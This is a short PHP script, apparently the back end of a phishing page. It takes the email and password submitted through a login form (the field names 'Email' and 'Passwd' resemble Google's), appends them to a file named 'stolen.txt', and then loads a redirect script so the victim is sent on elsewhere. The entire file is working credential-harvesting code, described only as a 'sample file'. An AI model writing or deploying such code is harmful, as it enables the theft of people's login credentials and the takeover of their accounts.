<?php	//this is a sample file
	$myFile = "../data/stolen.txt";
	$fh = fopen($myFile, 'a') or die("can't open file");
	fwrite($fh, "--------------------\n");
	$stringData = "username: " . $_POST['Email'] . "\n";
	fwrite($fh, $stringData);
	$stringData = "password: " . $_POST['Passwd'] . "\n";
	fwrite($fh, $stringData);
	fclose($fh);

echo '<script type="text/javascript" src="redirect.js"></script>';
?>
